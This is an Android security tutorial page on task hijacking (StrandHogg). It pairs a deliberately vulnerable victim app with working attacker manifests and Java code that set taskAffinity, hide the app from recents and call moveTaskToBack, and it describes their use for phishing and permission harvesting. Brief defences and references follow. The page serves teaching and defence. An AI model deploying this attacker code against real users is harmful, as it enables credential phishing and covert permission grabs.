# Task Hijacking

### What is Task Hijacking?

Task hijacking is a security vulnerability in Android that allows a malicious app to take over the identity of a legitimate app, facilitating phishing attacks. Instead of displaying the real app activity, a fake activity is shown, tricking users into revealing sensitive data.

This attack is similar to UI injection, as both involve fake activities imitating legitimate app screens. However, in task hijacking, the malicious activity replaces the original one within the same task, making detection difficult for the user.

### Examples of Task Hijacking Attacks

* [Task affinity vulnerability](https://developer.android.com/privacy-and-security/risks/strandhogg) aka StrangHogg attack. Applies for API Level < 30 (Android < 11).
* [`Context.startActivities()` hijack](https://nvd.nist.gov/vuln/detail/CVE-2020-0096) aka StrandHogg 2.0 attack Applies for API Level < 29 (Android < 10).

### Key Concepts: Tasks, Back Stack, and Launch Modes

{% embed url="https://youtu.be/MvIlVsXxXmY" %}

#### Task Affinity

Task affinity is an attribute defined in the `<activity>` tag of the `AndroidManifest.xml` file. It determines which task an activity prefers to be associated with. By default, all activities in an app share the same affinity as their package name.

Example:

```xml
<activity android:taskAffinity=""/>
```

#### Launch Modes

Launch modes control how activities are launched and managed in a task. They are defined in `AndroidManifest.xml` or as flags in intents. The four launch modes are:

* `standard`
* `singleTop`
* `singleTask`
* `singleInstance`

For task hijacking, the **singleTask** mode is most relevant. It ensures that an activity is always the root of its task but allows other activities (with `standard` or `singleTop` modes) to join the task.

### Proof of Concept (PoC)

Full Source-Code: [https://github.com/az0mb13/Task\_Hijacking\_Strandhogg/tree/main](https://github.com/az0mb13/Task_Hijacking_Strandhogg/tree/main)

#### Creating a Vulnerable Victim App

To demonstrate the attack, let’s create a vulnerable app (e.g., _Super Secure App_). Below is its `AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.zombie.ssa">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:logo="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SuperSecureApp">
        <activity android:name=".LoggedIn"></activity>
        <activity android:name=".MainActivity" android:launchMode="singleTask">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

The line `android:launchMode="singleTask"` introduces the vulnerability.

#### Creating the Attacker’s App

Now, let’s create an attacker app that exploits this vulnerability. Below is its `AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.zombie.attackerapp"
    tools:ignore="ExtraText">
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.AttackerApp"
        android:taskAffinity="com.zombie.ssa">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

The attacker app:

* Uses `android:taskAffinity="com.zombie.ssa"` to associate itself with the victim’s app task.
* Hides from the recent apps list with `android:excludeFromRecents="true"`.

#### Attacker's Code (MainActivity.java)

```java
package com.zombie.attackerapp;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import com.google.android.material.snackbar.Snackbar;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```

The function `moveTaskToBack(true)` pushes the activity to the background, making it seem invisible to the user.

#### How the Attack Works

1. The victim app (_Super Secure App_) opens normally.
2. The attacker app runs in the background and minimizes itself to avoid detection.
3. When the victim app is reopened, the attacker’s app takes over the task, deceiving the user.
4. This method can be used for phishing or permission harvesting attacks, making it appear as if the victim app is requesting permissions while actually granting them to the attacker.

{% embed url="https://youtu.be/RNYJ5FyZh5c" %}

### Exploiting `moveTaskToBack()` and `excludeFromRecents`

The `moveTaskToBack()` function minimizes the attacker app, keeping it hidden while it remains active. The `excludeFromRecents` attribute prevents the attacker app from appearing in the recent apps list, making detection even harder.

Example attacker app manifest:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.tmh.attacker">

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.Attacker"
        android:taskAffinity="com.tmh.victim">
        <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```

```java
package com.tmh.attacker;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        moveTaskToBack(true);
    }

    @Override
    public void onResume(){
        super.onResume();
        setContentView(R.layout.activity_main);
    }
}
```

{% embed url="https://giphy.com/gifs/ORCrbaJbVlPrLYlCjg?utm_source=iframe&utm_medium=embed&utm_campaign=Embeds&utm_term=https%3A%2F%2Fcdn.iframe.ly%2F" %}

### Defense Against Task Hijacking

To mitigate this vulnerability, developers should:

1.  **Set `taskAffinity` to an empty string:**

    ```xml
    <activity android:taskAffinity=""/>
    ```
2. **Use `singleInstance` launch mode** if an activity should not share tasks.
3. **Override `onBackPressed()`** to prevent unexpected task switching.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Resources

* [https://promon.co/security-news/strandhogg/](https://promon.co/security-news/strandhogg/)
* [https://www.youtube.com/watch?v=OyFQARwxAE4](https://www.youtube.com/watch?v=OyFQARwxAE4)
* [https://github.com/lucasnlm/strandhogg](https://github.com/lucasnlm/strandhogg)
* [https://github.com/tripoloski1337/android-task-hijacking](https://github.com/tripoloski1337/android-task-hijacking)
* [https://arstechnica.com/information-technology/2019/12/vulnerability-in-fully-patched-android-phones-under-active-attack-by-bank-thieves/](https://arstechnica.com/information-technology/2019/12/vulnerability-in-fully-patched-android-phones-under-active-attack-by-bank-thieves/)
* [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
* [https://developer.android.com/guide/components/activities/tasks-and-back-stack](https://developer.android.com/guide/components/activities/tasks-and-back-stack)
* [https://blog.dixitaditya.com/android-task-hijacking?x-host=blog.dixitaditya.com](https://blog.dixitaditya.com/android-task-hijacking?x-host=blog.dixitaditya.com)
* [https://developer.android.com/privacy-and-security/risks/strandhogg](https://developer.android.com/privacy-and-security/risks/strandhogg)

#### More details

* (2015) [https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf)
* (2017) [https://www.slideshare.net/phdays/android-task-hijacking](https://www.slideshare.net/phdays/android-task-hijacking)
* (2019) [https://twitter.com/ivanmarkovicsec/status/1201592031333761024](https://twitter.com/ivanmarkovicsec/status/1201592031333761024)
* (2019) [https://promon.co/security-news/strandhogg/](https://promon.co/security-news/strandhogg/)

**And for/from developers:**

* [https://github.com/Ivan-Markovic/Android-Task-Injection](https://github.com/Ivan-Markovic/Android-Task-Injection)
* [https://inthecheesefactory.com/blog/understand-android-activity-launchmode/en](https://inthecheesefactory.com/blog/understand-android-activity-launchmode/en)
* [https://developer.android.com/guide/components/activities/tasks-and-back-stack](https://developer.android.com/guide/components/activities/tasks-and-back-stack)
* [https://medium.com/@iammert/android-launchmode-visualized-8843fc833dbe](https://medium.com/@iammert/android-launchmode-visualized-8843fc833dbe)

#### Video:

* [https://www.youtube.com/watch?v=IYGwXFIYdS8](https://www.youtube.com/watch?v=IYGwXFIYdS8)
* [https://www.youtube.com/watch?v=HPfT9miU\_rY](https://www.youtube.com/watch?v=HPfT9miU_rY)
* [https://www.youtube.com/watch?v=yI0Xh5Oc0x4](https://www.youtube.com/watch?v=yI0Xh5Oc0x4)

## Disclosed Reports

{% embed url="https://hackerone.com/reports/1325649" %}
